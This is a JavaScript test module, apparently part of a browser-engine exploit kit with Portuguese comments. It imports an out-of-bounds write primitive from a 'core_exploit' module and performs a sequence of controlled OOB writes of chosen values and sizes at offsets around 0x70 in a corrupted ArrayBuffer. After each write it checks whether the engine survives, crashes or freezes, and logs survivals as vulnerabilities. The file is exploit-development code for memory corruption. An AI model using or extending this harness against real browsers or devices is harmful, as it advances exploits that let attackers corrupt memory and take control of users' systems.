// js/script3/testOOBWriteSurvival.mjs
import { logS3, PAUSE_S3, SHORT_PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

export async function executeOOBWriteSurvivalTest() {
    const FNAME_TEST = "executeOOBWriteSurvivalTest";
    logS3(`--- Iniciando Teste: Sobrevivência a Escritas OOB Críticas ---`, "test", FNAME_TEST);
    document.title = `OOB Write Survival Test`;

    const critical_base_offset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70

    const test_writes = [
        // Testes em torno do offset 0x70 com 0xFFFFFFFF (4 bytes)
        { offset: critical_base_offset, value: 0xFFFFFFFF, size: 4, desc: "Write_0xFFFFFFFF_at_0x70" },
        { offset: critical_base_offset - 4, value: 0xFFFFFFFF, size: 4, desc: "Write_0xFFFFFFFF_at_0x6C" },
        { offset: critical_base_offset + 4, value: 0xFFFFFFFF, size: 4, desc: "Write_0xFFFFFFFF_at_0x74" },

        // Testes em 0x70 com outros valores (4 bytes)
        { offset: critical_base_offset, value: 0x00000000, size: 4, desc: "Write_0x00000000_at_0x70" },
        { offset: critical_base_offset, value: 0x00000001, size: 4, desc: "Write_0x00000001_at_0x70" },
        { offset: critical_base_offset, value: 0x41414141, size: 4, desc: "Write_0x41414141_at_0x70" },

        // Testes em 0x70 com tamanhos diferentes
        { offset: critical_base_offset, value: 0xAA, size: 1, desc: "Write_0xAA_at_0x70_1Byte" },
        { offset: critical_base_offset, value: 0xBBBB, size: 2, desc: "Write_0xBBBB_at_0x70_2Bytes" },
        { offset: critical_base_offset, value: new AdvancedInt64("0xDDDDDDDDCCCCCCCC"), size: 8, desc: "Write_QWORD_Pattern_at_0x70" },
        { offset: critical_base_offset, value: new AdvancedInt64(0,0), size: 8, desc: "Write_QWORD_Zero_at_0x70" },
    ];

    for (let i = 0; i < test_writes.length; i++) {
        const current_test = test_writes[i];
        logS3(`\n--- Sub-teste (${i+1}/${test_writes.length}): ${current_test.desc} ---`, "subtest", FNAME_TEST);
        document.title = `Testing: ${current_test.desc}`;

        // Configurar um ambiente OOB limpo para cada sub-teste
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) {
            logS3("  Falha OOB Setup para este sub-teste. Pulando.", "error", FNAME_TEST);
            if (i < test_writes.length - 1) await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa antes de tentar o próximo
            continue;
        }
        logS3(`  Ambiente OOB configurado. oob_array_buffer_real.byteLength: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        await PAUSE_S3(SHORT_PAUSE_S3);

        let write_error = null;
        logS3(`  Realizando escrita OOB: ${isAdvancedInt64Object(current_test.value) ? current_test.value.toString(true) : toHex(current_test.value)} em oob_content[${toHex(current_test.offset)}] (size: ${current_test.size})...`, "warn", FNAME_TEST);
        try {
            if (current_test.offset < 0 || (current_test.offset + current_test.size) > oob_array_buffer_real.byteLength) {
                 logS3(`  AVISO: Escrita em ${toHex(current_test.offset)} (tam: ${current_test.size}) está fora dos limites do buffer (${oob_array_buffer_real.byteLength}). Pulando esta escrita.`, "error", FNAME_TEST);
                 write_error = new Error("Write out of buffer bounds for test setup.");
            } else {
                oob_write_absolute(current_test.offset, current_test.value, current_test.size);
                logS3("    Escrita OOB realizada com sucesso.", "good", FNAME_TEST);
            }
        } catch (e_write) {
            logS3(`    ERRO CRÍTICO durante a escrita OOB: ${e_write.name} - ${e_write.message}`, "error", FNAME_TEST);
            write_error = e_write;
        }

        if (write_error) {
            document.title = `ERROR on Write: ${current_test.desc}`;
            logS3(`  Não foi possível realizar a escrita OOB para ${current_test.desc}. Pulando verificações de sobrevivência.`, "error", FNAME_TEST);
            clearOOBEnvironment();
            if (i < test_writes.length - 1) await PAUSE_S3(MEDIUM_PAUSE_S3);
            continue;
        }

        // Operações de verificação imediata
        logS3("  Verificando funcionalidade pós-escrita OOB...", "info", FNAME_TEST);
        let survived_post_write = false;
        let post_write_error = null;

        // Introduzindo uma pausa antes das operações de verificação para dar chance ao congelamento se manifestar
        logS3("  Pausando por 2 segundos para observar congelamento imediato...", "info", FNAME_TEST);
        await PAUSE_S3(2000); // 2 segundos

        try {
            logS3("  Retomando após pausa. Tentando operações simples...", "info", FNAME_TEST);
            let x = 1 + 1;
            logS3(`    Operação matemática simples (1+1) OK. Resultado: ${x}`, "good", FNAME_TEST);

            await PAUSE_S3(100);

            logS3(`    Tentando alocar new ArrayBuffer(16)...`, "info", FNAME_TEST);
            let test_ab = new ArrayBuffer(16);
            logS3(`    Alocação de ArrayBuffer(16) OK. test_ab.byteLength: ${test_ab.byteLength}`, "good", FNAME_TEST);

            logS3(`    Tentando logS3 final do sub-teste...`, "info", FNAME_TEST);
            logS3(`    SOBREVIVEMOS ao sub-teste: ${current_test.desc}!`, "vuln", FNAME_TEST);
            survived_post_write = true;
            document.title = `Survived: ${current_test.desc}`;

        } catch (e_after) {
            logS3(`    ERRO CRÍTICO APÓS a escrita OOB no sub-teste ${current_test.desc}: ${e_after.name} - ${e_after.message}`, "critical", FNAME_TEST);
            if (e_after.stack) {
                logS3(`      Stack: ${e_after.stack}`, "error", FNAME_TEST);
            }
            post_write_error = e_after;
            document.title = `CRASH After Write: ${current_test.desc}`;
        }

        if (!survived_post_write && !post_write_error) {
            logS3("    AVISO: O script PODE TER CONGELADO após a escrita OOB, antes de completar as verificações.", "error", FNAME_TEST);
            document.title = `FREEZE? After: ${current_test.desc}`;
            // Se congelou, não podemos continuar para o próximo sub-teste nesta execução.
            // O usuário precisará reiniciar o teste para pular este.
            break;
        }
        
        clearOOBEnvironment(); // Limpa para o próximo sub-teste
        if (i < test_writes.length - 1) {
            logS3("  Pausando antes do próximo sub-teste...", "info", FNAME_TEST);
            await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa entre sub-testes
        }
    } // Fim do loop de test_writes

    logS3(`--- Teste de Sobrevivência a Escritas OOB Críticas CONCLUÍDO ---`, "test", FNAME_TEST);
}
